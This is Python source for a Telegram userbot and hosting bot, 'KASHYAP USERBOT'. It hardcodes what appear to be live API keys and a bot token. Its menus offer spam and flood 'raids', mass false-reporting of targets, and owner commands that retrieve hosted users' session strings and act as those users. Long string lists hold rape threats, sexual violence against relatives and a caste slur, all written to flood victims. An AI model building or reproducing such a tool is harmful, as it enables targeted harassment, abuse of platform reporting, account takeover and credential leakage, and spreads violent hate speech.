import os
import sys
import json
import time
import asyncio
import random
import re
import threading
import tempfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"KASHYAP USERBOT is Live!")

    def log_message(self, *a):
        pass


def run_web():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), H).serve_forever()


threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# KASHYAP USERBOT & HOSTING BOT (FULL FIXED EDITION)
# OWNER: KASHYAP (9239452757)
# ==========================================

try:
    import telethon
except ImportError:
    os.system(f"{sys.executable} -m pip install telethon")
    import telethon

try:
    from gtts import gTTS
except ImportError:
    os.system(f"{sys.executable} -m pip install gTTS")
    from gtts import gTTS

try:
    import edge_tts
except ImportError:
    os.system(f"{sys.executable} -m pip install edge-tts")
    try:
        import edge_tts
    except Exception:
        edge_tts = None

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError, UserNotParticipantError
from telethon.tl.functions.messages import ExportChatInviteRequest, SendReactionRequest, ReportRequest
from telethon.tl.functions.contacts import BlockRequest
from telethon.tl.functions.account import UpdateProfileRequest, ReportPeerRequest
from telethon.tl.functions.channels import GetParticipantRequest, EditTitleRequest, EditPhotoRequest, LeaveChannelRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.bots import SetBotCommandsRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChannelParticipantsBots,
    ChannelParticipantLeft,
    ChannelParticipantBanned,
    ReactionEmoji,
    BotCommand,
    BotCommandScopeDefault,
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonGeoIrrelevant,
    InputReportReasonFake,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails,
    InputReportReasonOther,
)

# CONFIGURATION
API_ID = 39105091
API_HASH = "257594e70a9926b6bb44644e17be94a9"
BOT_TOKEN = "9006459016:AAFEN8CV3LmnGaKgBkA3ATy7C4zTMhDTy8o"
OWNER_ID = 9239452757
OWNER_NAME = "KASHYAP"
BOT_BRAND = "KASHYAP USERBOT"
START_TIME = time.time()
SESSIONS_FILE = "sessions.json"
START_BANNER_PATH = "photo_2026-11-25_14-19-14.jpg"

# FORCE-JOIN CHANNEL & SUPPORT CONFIGURATION
FORCE_CHANNEL = "D_E_M_O_N302"
FORCE_CHANNEL_URL = "https://t.me/+HzmJMhZLcC82YWFl"
SUPPORT_URL = "https://t.me/+HzmJMhZLcC82YWFl"

REPORT_REASON_MAP = {
    "spam": InputReportReasonSpam(),
    "scam": InputReportReasonFake(),
    "violence": InputReportReasonViolence(),
    "porn": InputReportReasonPornography(),
    "abuse": InputReportReasonChildAbuse(),
    "copyright": InputReportReasonCopyright(),
    "geo": InputReportReasonGeoIrrelevant(),
    "fake": InputReportReasonFake(),
    "drugs": InputReportReasonIllegalDrugs(),
    "personal": InputReportReasonPersonalDetails(),
    "other": InputReportReasonOther(),
}


def format_uptime():
    sec = int(time.time() - START_TIME)
    days, sec = divmod(sec, 86400)
    hours, sec = divmod(sec, 3600)
    mins, secs = divmod(sec, 60)
    return f"{days}d {hours:02d}:{mins:02d}:{secs:02d}"


# MULTI-VOICE PRESETS (.voices, .tts <voice> [text] & 5 + 10 + 5 VOICE NOTE COMMANDS)
TTS_VOICE_PRESETS = {
    "girl":     {"voice": "hi-IN-SwaraNeural",   "rate": "+0%",   "pitch": "+6Hz",   "label": "Sweet Indian Girl 👧"},
    "boy":      {"voice": "hi-IN-MadhurNeural",  "rate": "+0%",   "pitch": "+0Hz",   "label": "Natural Indian Boy 👦"},
    "cute":     {"voice": "hi-IN-SwaraNeural",   "rate": "+12%",  "pitch": "+28Hz",  "label": "Cute Anime Girl 🌸"},
    "chipmunk": {"voice": "hi-IN-SwaraNeural",   "rate": "+35%",  "pitch": "+55Hz",  "label": "Funny Chipmunk 🐿️"},
    "villain":  {"voice": "hi-IN-MadhurNeural",  "rate": "-12%",  "pitch": "-28Hz",  "label": "Deep Villain Boss 😈"},
    "demon":    {"voice": "hi-IN-MadhurNeural",  "rate": "-22%",  "pitch": "-45Hz",  "label": "Scary Monster 💀"},
    "deep":     {"voice": "en-IN-PrabhatNeural", "rate": "-10%",  "pitch": "-25Hz",  "label": "Heavy Deep Baritone 🗿"},
    "robot":    {"voice": "en-IN-PrabhatNeural", "rate": "+5%",   "pitch": "-15Hz",  "label": "Cyborg Robot 🤖"},
    "ghost":    {"voice": "hi-IN-SwaraNeural",   "rate": "-25%",  "pitch": "-18Hz",  "label": "Haunted Ghost Echo 👻"},
    "fast":     {"voice": "hi-IN-MadhurNeural",  "rate": "+45%",  "pitch": "+5Hz",   "label": "Fast Rapper ⚡"},
    "slow":     {"voice": "hi-IN-MadhurNeural",  "rate": "-30%",  "pitch": "-8Hz",   "label": "Slow Dramatic 🌙"},
    "eng_boy":  {"voice": "en-IN-PrabhatNeural", "rate": "+0%",   "pitch": "+0Hz",   "label": "Indian English Boy 🧑"},
    "baby":     {"voice": "hi-IN-SwaraNeural",   "rate": "+22%",  "pitch": "+48Hz",  "label": "Cute Baby Kid 👶"},
    "old":      {"voice": "hi-IN-MadhurNeural",  "rate": "-24%",  "pitch": "-22Hz",  "label": "Old Grandpa Voice 👴"},
    "horror":   {"voice": "hi-IN-SwaraNeural",   "rate": "-32%",  "pitch": "-35Hz",  "label": "Dark Horror Whisper 🧟"},
    "news":     {"voice": "hi-IN-MadhurNeural",  "rate": "+8%",   "pitch": "+2Hz",   "label": "TV News Anchor 📺"},
}

VOICES_MENU_TEXT = (
    "```yaml\n"
    "🎙️ K A S H Y A P • V O I C E S\n\n"
    "girl     : Sweet Indian Girl 👧\n"
    "boy      : Natural Indian Boy 👦\n"
    "cute     : Cute Anime Girl 🌸\n"
    "chipmunk : Funny Chipmunk 🐿️\n"
    "villain  : Deep Villain Boss 😈\n"
    "demon    : Scary Monster 💀\n"
    "deep     : Heavy Deep Baritone 🗿\n"
    "robot    : Cyborg Robot 🤖\n"
    "ghost    : Haunted Ghost Echo 👻\n"
    "fast     : Fast Rapper ⚡\n"
    "slow     : Slow Dramatic 🌙\n"
    "eng_boy  : Indian English Boy 🧑\n"
    "baby     : Cute Baby Kid 👶\n"
    "old      : Old Grandpa Voice 👴\n"
    "horror   : Dark Horror Whisper 🧟\n"
    "news     : TV News Anchor 📺\n\n"
    "5 Pack   : .vgirl .vcute .vvillain .vdemon .vrobot\n"
    "10 Pack  : .vchipmunk .vdeep .vghost .vfast .vslow\n"
    "           .veng .vboy .v5 .v10 .vn10\n"
    "New 5    : .vbaby .vold .vhorror .vnews .v3\n"
    "Use: .tts villain [text]\n"
    "```"
)

TTS_USAGE_TEXT = (
    "```yaml\n"
    "🎙️ K A S H Y A P • V O I C E S\n\n"
    "Use: .tts villain [text] (List: .voices)\n"
    "```"
)


async def synthesize_voice_file(text: str, preset_name: str = "boy") -> str:
    preset = TTS_VOICE_PRESETS.get(preset_name.lower(), TTS_VOICE_PRESETS["boy"])
    tmp_f = tempfile.NamedTemporaryFile(suffix=".mp3", delete=False)
    tmp_f.close()
    out_path = tmp_f.name

    if edge_tts is not None:
        try:
            comm = edge_tts.Communicate(
                text=text,
                voice=preset["voice"],
                rate=preset["rate"],
                pitch=preset["pitch"],
            )
            await comm.save(out_path)
            if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                return out_path
        except Exception:
            pass

    lang_code = "en" if preset_name.lower() in ("deep", "robot", "eng_boy") else "hi"
    slow_flag = preset_name.lower() in ("slow", "ghost", "demon", "old", "horror")
    tts = gTTS(text=text, lang=lang_code, slow=slow_flag)
    tts.save(out_path)
    return out_path


# UNITY COMMAND LIST
UNITY_COMMAND_TEXT = (
    "╔═════════════════════════════════════════════════╗\n"
    "║         🤝 **KASHYAP UNITY COMMANDS** 🤝         ║\n"
    "╚═════════════════════════════════════════════════╝\n\n"
    "▸ **UNITY UTILITY COMMANDS**\n"
    "  • `.unity` — Open UNITY command list\n"
    "  • `.udl` — Convert replied sticker to image/PNG\n"
    "  • `.quote` — Make clean quote card from replied msg\n"
    "  • `.delall [1-100]` — Delete your own past messages\n"
    "  • `.remind <sec> <msg>` — Set timer reminder\n"
    "  • `.search <word>` — Search messages in current chat\n\n"
    "✦ **POWERED BY » KASHYAP USERBOT** ✦"
)

# STATIC COMMANDS MENU (FIXED LAYOUT — ALL COMMANDS INCLUDED)
STATIC_COMMANDS_TEXT = (
    "╔═════════════════════════════════════════════════╗\n"
    "║        ⚡ **KASHYAP USERBOT — COMMANDS** ⚡        ║\n"
    "╚═════════════════════════════════════════════════╝\n\n"
    "▸ **BOT & HOSTING**\n"
    "  `/start` • `/host` • `/login` • `/restart` • `/commands`\n"
    "  `/status` • `/logout` • `/support` • `/welcome [text]`\n"
    "  `/users` • `/getsession <user_id>` • `/watch <user_id> [count]`\n"
    "  `/exec <uid> <chat> <msg>` • `/broadcast <message>`\n\n"
    "▸ **REPORTBY KASHYAP (NEW REPORT SUITE)**\n"
    "  `.reportbykashyap` • `.report [reason] [note]`\n"
    "  `.massreport [1-10] [reason]` • `.spamreport` • `.scamreport`\n"
    "  `.fakereport` • `.chatreport [reason]` • `.reportreasons`\n\n"
    "▸ **UNITY COMMANDS**\n"
    "  `.unity` • `.udl` • `.quote` • `.delall [1-100]`\n"
    "  `.remind <sec> <msg>` • `.search <word>`\n\n"
    "▸ **RAID, TAG & ECHO**\n"
    "  `.raid [count]` • `.oneraid [count]` • `.rraid` • `.drraid`\n"
    "  `.spam [count] [text]` • `.fastspam [count] [text]` • `.flood [count] [text]`\n"
    "  `.slowspam [count] [text]` • `.revspam [count] [text]`\n"
    "  `.engraid [count]` • `.praid [count]` • `.braid [count]`\n"
    "  `.araid` • `.saraid` • `.oaraid` • `.faraid` • `.earaid`\n"
    "  `.dmraid [count]` • `.mraid [count]` • `.delayraid [sec] [count]`\n"
    "  `.emoraid [count]` • `.emojispam [count] [emoji] [text]`\n"
    "  `.mixraid [1-300]` • `.tagraid [1-300]` • `.capsraid [1-300]` • `.slowraid [1-300]`\n"
    "  `.badaid [count]` • `.saraid2 [count]` • `.ultraid [count]`\n"
    "  `.ssraid [count]` • `.extraraid [count]` • `.ttsraid [5-6] [text]`\n"
    "  `.onetagall [text]` • `.auto [link] [count]` • `.chup` • `.bol`\n"
    "  `.echo` • `.decho` • `.auracommand`\n\n"
    "▸ **HACK & ANIMATION (50s HACKS INCLUDED)**\n"
    "  `.hack` • `.matrix` • `.scan`\n"
    "  `.netghost` • `.rootkit` • `.cryptohack` • `.zeroday`\n"
    "  `.bruteforce [1-50]` • `.packetflood [1-50]` • `.sysbreach [1-50]`\n"
    "  `.loading` • `.boom` • `.fbi`\n"
    "  `.pulse [1-50]` • `.countanim [1-50]` • `.glitch [1-50]`\n"
    "  `.fuck` • `.type [text]`\n\n"
    "▸ **GROUP, ADMIN, CLONE & AUTOPIN**\n"
    "  `.ban` • `.unban` • `.kick` • `.mute` • `.unmute`\n"
    "  `.pin` • `.unpin` • `.del` • `.delme` • `.fwd` • `.invite` • `.purge [count]`\n"
    "  `.clone <target>` • `.rmclone` • `.nc <name>` • `.setpic` • `.kickme`\n"
    "  `.autopin on <id>` • `.autopin off <id>`\n"
    "  `.dmautopin on <t>` • `.dmautopin off <t>`\n"
    "  `.tagall [text]` • `.admins` • `.bots` • `.pingall`\n\n"
    "▸ **DM, REACT & CONTROL**\n"
    "  `.dmblock on|off` • `.dmwelcome on|off|reset` • `.dmcount` • `.resetdm`\n"
    "  `.dmmute` • `.undmmute`\n"
    "  `.say30 [text]` • `.stop30`\n"
    "  `.ar [emoji]` • `.dar` • `.uar` • `.duar` • `.rar [emojis...]` • `.drar`\n"
    "  `.stop` • `.stopall` • `.clear` • `.wipe` • `.restart` • `.help`\n\n"
    "▸ **FUN, VOICE NOTE (5+10+5) & EXTRA UTILITY**\n"
    "  `.voices` • `.tts [voice] [text]` • `.ttsraid [5-6] [text]`\n"
    "  5 Pack : `.vgirl` • `.vcute` • `.vvillain` • `.vdemon` • `.vrobot`\n"
    "  10 Pack: `.vchipmunk` • `.vdeep` • `.vghost` • `.vfast` • `.vslow`\n"
    "           `.veng` • `.vboy` • `.v5` • `.v10` • `.vn10`\n"
    "  New 5  : `.vbaby` • `.vold` • `.vhorror` • `.vnews` • `.v3`\n"
    "  `.roast` • `.iq` • `.love` • `.toss` • `.dice` • `.coin` • `.rate [topic]`\n"
    "  `.calc [expr]` • `.calc2 [expr]` • `.mock [text]` • `.mock2 [text]`\n"
    "  `.reverse [text]` • `.clap [text]` • `.vapor [text]`\n"
    "  `.trim [text]` • `.caps [text]` • `.lower [text]` • `.title [text]`\n"
    "  `.ship` • `.slap` • `.hug` • `.8ball [question]` • `.fact` • `.shayari`\n"
    "  `.steal` • `.caption <text>` • `.ghost [sec] [text]` • `.tginfo`\n"
    "  `.bio <text>` • `.name <first> | <last>`\n"
    "  `.ping` • `.ping2` • `.uptime` • `.alive` • `.alive2` • `.id` • `.id2`\n"
    "  `.info` • `.info2` • `.whois` • `.whois2` • `.chatinfo` • `.chatinfo2`\n"
    "  `.stats` • `.stats2` • `.time` • `.date` • `.afk [reason]` • `.timebio on|off`\n"
    "  `.save` • `.save2`\n\n"
    "✦ **POWERED BY » KASHYAP USERBOT** ✦"
)

AURA_COMMAND_TEXT = (
    "╔═════════════════════════════════════════════════╗\n"
    "║         ✨ **KASHYAP AURA COMMANDS** ✨          ║\n"
    "╚═════════════════════════════════════════════════╝\n\n"
    "⚡ **AURA RAID PACK (MAX LIMIT: 300)**\n"
    "  • `.raid [1-300]` • `.oneraid [1-300]`\n"
    "  • `.engraid [1-300]` • `.praid [1-300]` • `.braid [1-300]`\n"
    "  • `.araid [1-300]` • `.saraid [1-300]` • `.oaraid [1-300]` • `.faraid [1-300]`\n"
    "  • `.earaid [1-300]` • `.mraid [1-300]` • `.emoraid [1-300]`\n"
    "  • `.mixraid [1-300]` • `.tagraid [1-300]` • `.capsraid [1-300]` • `.slowraid [1-300]`\n"
    "  • `.badaid [1-300]` • `.saraid2 [1-300]` • `.ultraid [1-300]`\n"
    "  • `.ssraid [1-300]` • `.extraraid [1-300]`\n"
    "  • `.tts [voice] [text]` • `.voices` (16 AI voices)\n"
    "  • 5 Pack : `.vgirl` • `.vcute` • `.vvillain` • `.vdemon` • `.vrobot`\n"
    "  • 10 Pack: `.vchipmunk` • `.vdeep` • `.vghost` • `.vfast` • `.vslow` • `.veng` • `.vboy` • `.v5` • `.v10` • `.vn10`\n"
    "  • New 5  : `.vbaby` • `.vold` • `.vhorror` • `.vnews` • `.v3`\n"
    "  • `.ttsraid [5-6] [text]` (5-6 voice notes)\n\n"
    "💬 **AURA DM & CONTROL**\n"
    "  • Har 19th incoming DM par: `wolcome to my dm kaise ho`\n"
    "  • `.rraid` / `.drraid` • `.echo` / `.decho` • `.chup` / `.bol`\n"
    "  • `.stop` • `.stopall` • `.wipe` • `.restart` • `.help`\n\n"
    "✦ **POWERED BY » KASHYAP USERBOT** ✦"
)

EXTRA_PANEL_TEXT = (
    "┏━「 ✦ **EXTRA MENU** ✦ 」━┓\n"
    "┃ • `.auracommand` — Aura Command Pack\n"
    "┃ • `.voices` — 16 Voice Presets List\n"
    "┃ • `.reportbykashyap` — Report Suite Menu\n"
    "┃ • `.unity` — UNITY Utility Command List\n"
    "┃ • `.udl` • `.quote` • `.delall` • `.remind` • `.search`\n"
    "┃ • 5 Pack : `.vgirl .vcute .vvillain .vdemon .vrobot`\n"
    "┃ • 10 Pack: `.vchipmunk .vdeep .vghost .vfast .vslow`\n"
    "┃            `.veng .vboy .v5 .v10 .vn10`\n"
    "┃ • New 5  : `.vbaby .vold .vhorror .vnews .v3`\n"
    "┃ • `.ttsraid [5-6] [text]` — 5-6 Voice Notes\n"
    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
)

REPORTBY_KASHYAP_TEXT = (
    "┏━「 🚨 **REPORTBY KASHYAP** 🚨 」━┓\n"
    "┃ • `.report [reason] [note]`\n"
    "┃   ↳ Reply ya `@username/id` ko report karein\n"
    "┃ • `.massreport [1-10] [reason]`\n"
    "┃   ↳ Ek saath 1-10 reports submit karein\n"
    "┃ • `.spamreport` — Instant spam report\n"
    "┃ • `.scamreport` — Instant scam/fraud report\n"
    "┃ • `.fakereport` — Instant fake profile report\n"
    "┃ • `.chatreport [reason]` — Group/Channel report\n"
    "┃ • `.reportreasons` — Reasons list dekhein\n"
    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
)

CATEGORY_TEXTS = {
    "reply": (
        "┏━「 ↩ **REPLY & ECHO COMMANDS** 」━┓\n"
        "┃ • `.rraid` / `.drraid` — Reply raid on/off\n"
        "┃ • `.echo` / `.decho` — Mirror echo on/off\n"
        "┃ • `.chup` / `.bol` — Mute/unmute user messages\n"
        "┃ • `.roast` — Roast line\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "spam": (
        "┏━「 ✦ **SPAM & FLOOD COMMANDS** 」━┓\n"
        "┃ • `.spam [1-300] [text]` — Normal spam\n"
        "┃ • `.fastspam [1-300] [text]` — Fast spam\n"
        "┃ • `.flood [1-300] [text]` — Flood spam\n"
        "┃ • `.slowspam [1-300] [text]` — Slow spam\n"
        "┃ • `.revspam [1-300] [text]` — Reverse spam\n"
        "┃ • `.emojispam [1-300] [emoji] [text]`\n"
        "┃ • `.auto [link] [1-300]`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "purge": (
        "┏━「 ✘ **PURGE & CLEAN COMMANDS** 」━┓\n"
        "┃ • `.purge [count]` — Delete messages (1-100)\n"
        "┃ • `.clear` — Clear messages\n"
        "┃ • `.del` / `.delme` — Delete message\n"
        "┃ • `.ghost [sec] [text]` — Auto-delete msg\n"
        "┃ • `.wipe` — Reset chat tasks & states\n"
        "┃ • `.stop` / `.stopall` — Stop active tasks\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "sudo": (
        "┏━「 🛡 **SUDO, ADMIN & BOT COMMANDS** 」━┓\n"
        "┃ • `.ban` • `.unban` • `.kick` • `.mute` • `.unmute`\n"
        "┃ • `.pin` • `.unpin` • `.fwd` • `.invite` • `.kickme`\n"
        "┃ • `.clone <target>` • `.rmclone` • `.nc <name>` • `.setpic`\n"
        "┃ • `/host` • `/restart` • `/commands` • `/status` • `/logout` • `/support`\n"
        "┃ • `/users` • `/getsession <id>` • `/watch <id> [n]`\n"
        "┃ • `/exec <uid> <chat> <msg>` • `/broadcast <msg>`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "at_tag": (
        "┏━「 ◈ **AT-TAG & MENTION COMMANDS** 」━┓\n"
        "┃ • `.tagall [text]` — Tag group members\n"
        "┃ • `.onetagall [text]` — Tag members one-by-one\n"
        "┃ • `.admins` — Tag admins\n"
        "┃ • `.bots` — Tag bots\n"
        "┃ • `.pingall` — Tag active members\n"
        "┃ • `.tagraid [1-300]` — Tag raid\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "raids": (
        "┏━「 ☠ **RAIDS & VOICE NOTE COMMANDS (MAX 300)** 」━┓\n"
        "┃ • `.raid [1-300]` • `.engraid` • `.praid` • `.braid`\n"
        "┃ • `.araid` • `.saraid` • `.oaraid` • `.faraid` • `.earaid`\n"
        "┃ • `.dmraid` • `.mraid` • `.delayraid` • `.emoraid`\n"
        "┃ • `.mixraid` • `.capsraid` • `.slowraid`\n"
        "┃ • `.badaid` • `.saraid2` • `.ultraid`\n"
        "┃ • `.ssraid` • `.extraraid`\n"
        "┃ • `.tts [voice] [text]` • `.voices` • `.ttsraid [5-6] [text]`\n"
        "┃ • 5 Pack : `.vgirl .vcute .vvillain .vdemon .vrobot`\n"
        "┃ • 10 Pack: `.vchipmunk .vdeep .vghost .vfast .vslow`\n"
        "┃            `.veng .vboy .v5 .v10 .vn10`\n"
        "┃ • New 5  : `.vbaby .vold .vhorror .vnews .v3`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "oneword": (
        "┏━「 ✎ **ONEWORD & TEXT COMMANDS** 」━┓\n"
        "┃ • `.oneraid [1-300]` — One-word & tukda raid\n"
        "┃ • `.type [text]` — Typewriter animation\n"
        "┃ • `.mock` • `.mock2` • `.reverse` • `.clap` • `.vapor`\n"
        "┃ • `.trim` • `.caps` • `.lower` • `.title`\n"
        "┃ • `.calc [expr]` • `.calc2 [expr]`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "autopin": (
        "┏━「 ✦ **AUTOPIN, DM & REACT COMMANDS** 」━┓\n"
        "┃ • `.autopin on|off [chat_id]`\n"
        "┃ • `.dmautopin on|off [user_id]`\n"
        "┃ • `.dmblock on|off` • `.dmwelcome on|off|reset`\n"
        "┃ • `.dmcount` • `.resetdm` • `.dmmute` • `.undmmute`\n"
        "┃ • `.ar [emoji]` • `.dar` • `.uar` • `.duar` • `.rar` • `.drar`\n"
        "┃ • `.say30 [text]` • `.stop30` • `.afk [reason]` • `.timebio on|off`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ),
    "reportbykashyap": REPORTBY_KASHYAP_TEXT,
    "unity": UNITY_COMMAND_TEXT,
}

# ONE-WORD & TUKDA HEAVY GAALI DATABASE (.oneraid ke liye tukda lines)
TUKDA_RAIDS = [
    "CHAMAR HIJDE KE BACCHE TERI MAA JINDA KARR",
    "TERI MAUSI CHODU KYA RE",
    "TERI MAA KI GAMD MAST KILASTI HAI MERE LAMD KO DEKH KE",
    "BAHAR NIKL RAND KE BACCHE TERI MAA KI CHOOT BACHAAKE RAKH TOO",
    "TERI MAAA KA RAPE KAR DUNGA JINDA HO JAA TATTE TERI MAAA KI KALI GAMS TOD DUNGAA",
    "MAAA KAA BHAODAA FARUGAA TURUR",
    "TIERIR MIYAA KII BURR MEE LU",
    "TERI BHN KI LIPS LAAL HAI",
    "TERI MAAKA BOSHDA FAT GYAAA KYA NICEE UTH CHAL",
    "TERIII MAA KII FUDII MARR DUGAA RANDII KEE B",
    "TERI BHN KI CHUMMI MERE LAND PE AMST",
    "UTH TERI BEHEN KA KAALA BOSHDA MRU",
    "TERI MAAKA BOSHDA FAT GYAAA KYA NICEE UTH",
    "TERI BHN KI CHUT RAGADNA MERE LAND PE",
    "TIEIR BHENN KII BURR CHOGAAA",
    "OYEE RANDII KE BACHEE",
    "RE RANDI KE BACCHE UTH APNI MAAKO BACCHA",
    "TERI MAA KI CHUT ME MEOW GHOP GHOP GHOP",
    "MRA KAISE TU RANDIKE AULAAAD BACHA APNI MAA KA PHATA BHOSDA AB",
    "TERI MAAA KA BHOSDA ME FLOOD AA GAYA",
    "TIERI MOSII KII CHUTT ME AICDD DLAAA DUGA",
]

RAW_BASE_GAALIS = [
    "MADARCHOD", "GAANDU", "CHUTIYA", "BHADWA", "RANDI", "TERI MAA  KI CHUT FAAD DUNGA",
    "LUND", "HIJDA", "CHHAKKA", "SUAR", "KAMINEY", "TCS KE CHOODE",
    "KANJAR", "HARAMKHOR", "BESHARM", "CHUTMARIKE", "LODU", "DAICHOD",
    "CHHINAR", "KAMJAT", "BHAND", "TAPORI", "GADDAR", "BHNCHOD",
    "LAVDE", "KUTTA", "BALLU", "DHAKKAN", "CHUTMARIKA",
    "BAYMAN", "NALAYAK", "ULRAG", "FARIA", "CHAMPAN",
    "BEGHARAT", "KAMINE", "CHALBAZ", "KASAI", "GHATIYA", "TERI MAA RANDYY",
]

SINGLE_GAALIS = [
    "MADARCHOD", "BHOOTNIKE", "CHUTIYE", "GANDU", "RANDI", "RANDI FAD DU TRY",
    "LODE", "BHOSDIKE", "LAWDE", "HIJRA", "MC", "BC", "MADARCHOD",
    "TERIMA", "CHUT", "HRAMKHOR", "NALAYAK", "BAKKANCHOD",
] + TUKDA_RAIDS

ENGLISH_RAIDS = [
    "YOU ARE A TOTAL CLOWN KNOW YOUR PLACE BEFORE SPEAKING",
    "SIT DOWN KID YOUR WHOLE ARGUMENT IS PURE TRASH",
    "STOP BARKING LIKE A STRAY DOG NOBODY CARES ABOUT YOU",
    "YOU EMBARRASS YOURSELF EVERY TIME YOU OPEN YOUR MOUTH",
    "HOLD THIS L AND WALK AWAY QUIETLY FOOL",
    "PURE JOKE ENERGY FROM START TO FINISH"
]

PUNJABI_RAIDS = [
    "TERI MAA DI LUN VICH SOOTA PA DU MADARCHODA AUKAT CH REH",
    "BHOSDIKEYA TERI BHEN DI LUN VICH RICKSHAW CHALA DU KUTTEYA",
    "RANDI DE PUTTAR TERE PYO NU DASSDA AA TERI MAA DI LUN VICH DANDA",
    "CHUTIYA SALEYA APNI AUKAT VEKH LE TERI MAA DI LUN CH PAANI PA DU",
    "KUTTEY DE BACCHEYA TERA KHANDAN HI NALAYAK AA BHOSDIKEYA",
    "TERI MAA DI LUN VICH GARM LOHA PA DU MADARCHOD SALEYA",
    "BHOSDIKEYA BHAJJA YAHA TON TERI BHEN DI LUN VICH PHATAKA PA DU"
]

BENGALI_RAIDS = [
    "TOR PAYA KHA BOKACHODA NIZZER AUKAT BUJHE KATHA BOL",
    "MAGIR PO BESHYA TOR BUKER UPOR DIYE GARI CHALIYE DEBO",
    "CHODNA TOR MUKH BANDH RAKH KUKURER MOTO GHEU GHEU KORIS NA",
    "KHANKIR CHELE TOR BHAAT CHOR AUKAT SOBEI JANE",
    "TOR GAND MERE LAL KORE DEBO BOKACHODA SALA",
    "BESHYAR BACCHA BESHI PAKAMI KORIS NA EKHANE"
]

MULTI_LINE_RAIDS = [
    "TERI AUKAT ZERO HAI BHAI\nPEHLE APNE LEVEL PAR AA\nFIR BAAT KARNA",
    "SHOR KAM KAR AUR KAAM DEKH\nTERI HAR BAAT ME DAM NAHI\nNIKAL LE YAHA SE"
]

EXTRA_RAIDS = [
    "TERI VAHEN KE BHOSDIKE MEI BESAN KE LADDU",
    "ACE TERII MUMMY KE BOSHDE KI HADIYAA TOD DUNGAA",
    "TERI MAA KE SATH SUAR KA SEX KARWA DUNGAA EK SATH 6-6 BACHE DEGI 💰 🔥 😱",
    "TOHAR BAHIN CHODU BBAHEN KE LAWDE USME MITTI DAL KE CEMENT SE BHAR DU 🏠 🤢 😡 💥",
    "TERI MAA KE BHOSDE MEI GITHUB DAL KE APNA BOT HOST KARUNGAA 😂 👊 🙎 😍",
    "TERI MUMMY AUR BAHEN KO DAUDA DAUDA NE CHODUNGA UNKE NO BOLNE PE BHI LAND GHUSA DUNGA ANDER TAK 😎 😎 😂 🔥",
    "YE BAAP TERI BHEN KI GAAND ME LAND",
    "TERI MAAKE BUR ME HATHORE SE KILLI THOK DUNGA",
    "TERI BEHEN KI CHUT PE YE BAAP EXHIBITION HALL BANA KE DISPLAY KARATA HAI",
    "TERI MAUSI KE GAND ME DANDA DALY",
    "TERI BEHEN KE BOSHDE ME SASTA KEYBOARD LAGAUNGA",
    "AGAR TU CP BOLEGA TO ME TERI MAAKE BOSHDE ME GARAM MUTTHI MARUNGA",
    "TERI BEHEN KI GAND ME ITNE CHAPPAL MARUNGA KI TERI BEHEN KI GAND TAMATAR KE TARAH LAAL HOJAYENGA",
    "TERI DIDI KI CHUT FAAD KAR BICH BAJAR ME NILAM KARDUNGA",
    "TERI MAA BETIYA CHOD KAR KAFFAN ME DAFAN KARDUNGA",
    "JADA NA UCHAL WARNAA TERI MAA CHOD DENGEE",
    "TERI MAAKI CHUT MARUNGA NON STOP",
    "TERI MAAKE BOSHDE ME GOLI MAAR KAR USSKE BOSHDE ME 100 CHEDD KARDUNGA",
    "TERI DIDI KE BOSHDE ME ITNE CHAPPAL MARUNGA KI TERI DIDI KE BOSHDE ME BAWASIR HOJAYENGA",
    "TERI MAA MERE LAVDE PAR UCHAL UCHAL KAR CHUDTI HAI",
    "TERI HAR BAKWAS KA JAWAB SEEDHA MUH PAR MILEGA AUKAT ME REH",
    "ITNA BOLNE SE PEHLE APNI VALUE DEKH LE JO ZERO HAI",
    "SHOR MACHANE SE KUCH NAHI HOGA APNE LEVEL PAR AA PEHLE",
    "TERI AUKAT SIRF SUNNE KI HAI BOLNE KI NAHI",
    "HAR BAAR KHARED KAR BECH DENGE TERE JAISE NAAMON KO",
    "APNI HAD ME REH KAR BAAT KAR WARNA ZAMEEN ME MIL JAYEGA",
    "TERA PURA GROUP MIL KAR BHI MUQABLA NAHI KAR SAKTA",
    "BAKWAAS BAND KAR AUR APNA RASTA NAAP",
    "TERE JAISE LOG ROZ AATE HAIN AUR ROZ DHUL CHAAT TE HAIN",
    "AWAZ NEECHI RAKH AUR APNI AUKAT YAAD RAKH"
] + TUKDA_RAIDS

SCREENSHOT_AND_EXTRA_RAIDS = EXTRA_RAIDS

ROAST_LINES = [
    "Baatein aisi kar rahe ho jaise signal 1 bar pe atka ho.",
    "Confidence solid hai, bas points thode aur le aao.",
    "Aapki argument bilkul zero-watt bulb jaisi lag rahi hai.",
    "Bolne se pehle ek baar mic check kar liya karo."
]

RAID_EMOJIS = ["💀", "🔥", "🤡", "⚡", "😈", "💣", "🧨", "👁️"]

# Expanding dynamically to 1000+ heavy raid variants
GAALIS = []
